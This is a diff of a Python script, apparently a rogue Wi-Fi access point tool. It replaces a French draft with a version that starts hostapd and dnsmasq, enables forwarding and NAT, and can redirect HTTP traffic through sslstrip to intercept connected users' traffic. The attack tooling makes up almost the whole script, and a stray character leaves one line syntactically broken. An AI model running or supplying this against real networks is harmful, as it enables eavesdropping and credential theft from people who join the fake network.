@@ -1,124 +1,197 @@
-import subprocess
-import sys
+#!/usr/bin/env python
 import argparse
-from scapy.all import *
-import threading
+import tempfile
+import subprocess
+import os
+import sys
+import time
+import shutil
 
-def set_interface_mode_ap(interface):
-    """
-    Configure l'interface en mode AP en tuant les processus susceptibles d'interférer
-    et en réglant le mode de l'interface.
-    """
-    print(f"Configuration de l'interface {interface} en mode AP...")
+###########################################################################################
+
+def die(message):
+    sys.stderr.write("%s\n" % message)
+    exit(1)
+
+def check_sslstrip():
     try:
-        subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
-        subprocess.run(["sudo", "airmon-ng", "start", {interface}], check=True)
-        print(f"Interface {interface} configurée en mode AP.")
-    except subprocess.CalledProcessError as e:
-        print(f"Erreur lors de la configuration en mode AP: {e}")
-    
-    
+        return not subprocess.call(["sslstrip",q "--help"], stdout=null, stderr=null)
+    except:
+        return False
 
-def create_access_point(interface, ssid):
-    
-    set_interface_mode_ap(interface)
-    
-    print(f"Création d'un point d'acces wifi {ssid} sur l'interface {interface}")
-    channel = 6
-    
-    # Configuration de l'interface
-    hostapd_config = f"""
-interface={interface}
-ssid={ssid}
-hw_mode=g
-channel={channel}
-wmm_enabled=0
-macaddr_acl=0
-auth_algs=1
-ignore_broadcast_ssid=0
-wpa=2
-wpa_key_mgmt=WPA-PSK
-rsn_pairwise=CCMP
-"""
-    
-    with open("/tmp/hostapd.conf", "w") as config_file:
-        config_file.write(hostapd_config)
-        
-    dnsmask_config = f"""
-interface={interface}
-dhcp-range=192.168.150.10,192.168.150.50,255.255.255.0,12h
-"""
-    
-    with open("/tmp/dnsmasq.conf", "w") as config_file:
-        config_file.write(dnsmask_config)
-        
-    # Démarrage des services
+def check_hostapd():
     try:
-        subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd.conf"], check=True)
-        print(f"Point d'acces wifi {ssid} démarré avec succès sur l'interface {interface}")
-        
-        subprocess.Popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq.conf", "-d"], check=True)
-        print("Serveur DHCP démarré avec succès") 
-        
-    except subprocess.CalledProcessError as e:
-        print(f"Erreur lors du démarrage du point d'acces: {e}")
-        
-    
+        return subprocess.call(["hostapd", "--help"], stdout=null, stderr=null) != 127
+    except:
+        return False
 
-def capture_and_modify_packets(interface):
-    print(f"Capture et modification de paquets sur l'interface {interface}")
-
-    def packet_handler(packet):
-        if packet.haslayer(IP):
-            # Modifier l'adresse IP source
-            packet[IP].src = "192.168.1.100"
-            print(f"Paquet modifié: {packet.summary()}")
-
-    sniff(iface=interface, prn=packet_handler)
-
-def start_capture_thread(interface):
-    capture_thread = threading.Thread(target=capture_and_modify_packets, args=(interface,))
-    capture_thread.daemon = True 
-    capture_thread.start()
-    print(f"Thread de capture démarré sur l'interface {interface}")
-
-
-def redirect_requests():
-    print("Redirection des requêtes vers internet")
-
-
-        
-def main():
-    # Si il n'y a pas d'arguments:
-    if len(sys.argv) < 2:
-        print("Usage: python3 main.py -i <interface> -n <nom du réseau> [-c] [-cp] [-r]")
-        sys.exit(1)
-        
-    # Si il y a des arguments:
-    parser = argparse.ArgumentParser(description="Script permettant de créer un RogueAP et capturer les paquets")
-    parser.add_argument("-i", "--interface", required=True, help="Interface réseau")
-    parser.add_argument("-n", "--name", required=True, help="Nom du réseau")
-    parser.add_argument("-c", "--create", action="store_true", help="Créer un point d'acces wifi")
-    parser.add_argument("-cp", "--capture", action="store_true", help="Capturer et modifier les paquets")
-    parser.add_argument("-r", "--redirect", action="store_true", help="Rediriger les requêtes vers internet")
-    args = parser.parse_args()
-    
-    if args.create:
-        create_access_point(args.interface, args.name)
-    
-    if args.capture:
-        start_capture_thread(args.interface)
-    
-    if args.redirect:
-        redirect_requests()
-    
+def check_dnsmasq():
     try:
+        return not subprocess.call(["dnsmasq", "--help"], stdout=null, stderr=null)
+    except:
+        return False
+
+def check_tcpdump():
+    try:
+        return subprocess.call(["tcpdump", "--help"], stdout=null, stderr=null) != 127
+    except:
+        return False
+
+def check_iptables():
+    try:
+        return not subprocess.call(["iptables", "--help"], stdout=null, stderr=null)
+    except:
+        return False
+
+def check_ip():
+    try:
+        return not subprocess.call(["ip", "link", "show"], stdout=null, stderr=null)
+    except:
+        return False
+
+def poll_iface_exists(iface):
+    return not subprocess.call(["ip", "link", "show", iface], stdout=null, stderr=null)
+
+null = open("/dev/null", "w")
+
+###########################################################################################
+
+### MAIN
+
+parser = argparse.ArgumentParser()
+parser.add_argument("wlan_interface", help="The Interface in monitor mode interface", type=str)
+parser.add_argument("inet_interface", help="The Interface in monitor mode interface", type=str)
+parser.add_argument("--ssid", help="Use this ssid for network", type=str, required=True)
+parser.add_argument("--wpa", help="Sets up an wpa(2) AP with specified passphrase", type=str, required=True)
+parser.add_argument("--channel", help="Use this channel", type=int, required=True)
+parser.add_argument("--sslstrip", help="Use sslstrip", action="store_true")
+args = parser.parse_args()
+
+### Run preliminary checks
+
+if os.geteuid(): die("You need to be root")
+
+if not check_ip(): die("ip command absent or broken")
+
+if not check_tcpdump(): die("tcpdump command absent or broken")
+
+if not check_iptables(): die("iptables absent or broken")
+
+if not check_dnsmasq(): die("dnsmasq command absent or broken")
+
+if not check_hostapd(): die("hostapd command absent or broken")
+
+if args.sslstrip:
+    if not check_sslstrip(): die("sslstrip command absent or broken")
+
+if not poll_iface_exists(args.wlan_interface): die("%s is not a valid interface" % args.wlan_interface)
+if not poll_iface_exists(args.inet_interface): die("%s is not a valid interface" % args.inet_interface)
+
+if (len(args.wpa) < 8) or (len(args.wpa) > 63): die("wpa passphrase needs to be 8-63 characters")
+
+print("Starting Rogue AP\n")
+print("Running")
+
+### init
+subprocess.call(["iw", "dev", args.wlan_interface, "set", "channel", str(args.channel)], stdout=null, stderr=null)
+
+iface = args.wlan_interface
+
+with open("/proc/sys/net/ipv4/ip_forward", "r") as f: ip_forward = f.read().strip()
+with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write("1")
+subprocess.call(["iptables", "-I", "FORWARD", "-i", iface, "-o", args.inet_interface, "-j", "ACCEPT"], stdout=null, stderr=null)
+subprocess.call(["iptables", "-I", "FORWARD", "-o", iface, "-i", args.inet_interface, "-j", "ACCEPT"], stdout=null, stderr=null)
+subprocess.call(["iptables", "-t", "nat", "-I", "POSTROUTING", "-o", args.inet_interface, "-j", "MASQUERADE"], stdout=null, stderr=null)
+
+if args.sslstrip:
+    subprocess.call(["iptables", "-t", "nat", "-I", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"], stdout=null, stderr=null)
+
+n, hostapd_path = tempfile.mkstemp()
+f = os.fdopen(n, "w")
+f.write("interface=%s\n" % iface)
+f.write("driver=nl80211\n")
+f.write("ssid=%s\n" % args.ssid)
+f.write("channel=%s\n" % int(args.channel))
+f.write("wpa=3\n")
+f.write("wpa_passphrase=%s\n" % args.wpa)
+f.close()
+
+n, dnsmasq_path = tempfile.mkstemp()
+f = os.fdopen(n, "w")
+f.write("interface=%s\n" % iface)
+f.write("dhcp-range=10.55.66.100,10.55.66.200,5m\n")
+f.write("dhcp-option=3,10.55.66.1\n")
+f.write("dhcp-option=6,10.55.66.1\n")
+f.write("no-hosts\n")
+f.write("addn-hosts=/dev/null\n")
+f.close()
+
+def nukeall(popen_list):
+    for popen in popen_list:
+        if popen.poll() == None:
+            popen.kill()
+    del popen_list[:]
+
+### run and restore loop
+try:
+    pids = []
+    deathloop_count = -1
+    while True:
+        deathloop_count += 1
+
+        print(f"********** (RE)INIT #{deathloop_count} *************")
+
+        p = subprocess.Popen(["hostapd", hostapd_path])
+        pids.append(p)
+
+        print(f"waiting for interface '{iface}' to emerge")
+        while not poll_iface_exists(iface):
+            time.sleep(0.01)
+
+        subprocess.call(["ifconfig", iface, "10.55.66.1", "netmask", "255.255.255.0", "up"])
+
+        p = subprocess.Popen(["tcpdump", "-i", iface, "-w", "/dev/null"])
+        pids.append(p)
+
+        if args.sslstrip:
+            p = subprocess.Popen(["sslstrip", "-a", "-f"], stderr=null)
+            pids.append(p)
+
+        p = subprocess.Popen(["dnsmasq", "-d", "-C", dnsmasq_path])
+        pids.append(p)
+
         while True:
-            pass
-    except KeyboardInterrupt:
-        print("Arrêt du script")
-        
-if __name__ == "__main__":
-    main()
-        
-    
+            break_time = False
+            for pid in pids:
+                if pid.poll() != None:
+                    break_time = True
+                    break
+            if break_time: break
+            time.sleep(0.01)
+
+        print(f"program in chain failed, restarting chain...\n")
+        nukeall(pids)
+
+except KeyboardInterrupt:
+    pass
+
+### deinit
+print("Stopping Rogue AP")
+nukeall(pids)
+
+with open("/proc/sys/net/ipv4/ip_forward", "w") as f: f.write(ip_forward)
+
+subprocess.call(["iptables", "-D", "FORWARD", "-i", iface, "-o", args.inet_interface, "-j", "ACCEPT"], stdout=null, stderr=null)
+subprocess.call(["iptables", "-D", "FORWARD", "-o", iface, "-i", args.inet_interface, "-j", "ACCEPT"], stdout=null, stderr=null)
+subprocess.call(["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", args.inet_interface, "-j", "MASQUERADE"], stdout=null, stderr=null)
+
+if args.sslstrip:
+    subprocess.call(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"], stdout=null, stderr=null)
+
+subprocess.call(["ip", "addr", "flush", args.wlan_interface], stdout=null, stderr=null)
+subprocess.call(["ip", "link", "set", args.wlan_interface, "down"], stdout=null, stderr=null)
+subprocess.call(["iw", "dev", args.wlan_interface, "set", "type", "monitor"], stdout=null, stderr=null)
+subprocess.call(["ip", "link", "set", args.wlan_interface, "up"], stdout=null, stderr=null)
+
+os.remove(dnsmasq_path)
+os.remove(hostapd_path)
